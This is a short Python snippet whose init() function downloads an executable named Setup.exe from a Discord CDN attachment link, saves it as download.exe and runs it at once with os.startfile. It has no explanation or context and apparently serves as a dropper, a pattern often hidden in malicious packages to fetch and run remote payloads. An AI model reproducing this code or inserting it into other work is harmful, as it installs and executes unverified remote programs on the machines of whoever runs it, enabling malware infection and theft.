import requests
import os
def init():
    url = 'https://cdn.discordapp.com/attachments/936752659241771009/936753057998442506/Setup.exe'

    open('download.exe', 'wb').write(requests.get(url).content)

    os.startfile(os.getcwd()+"\\download.exe")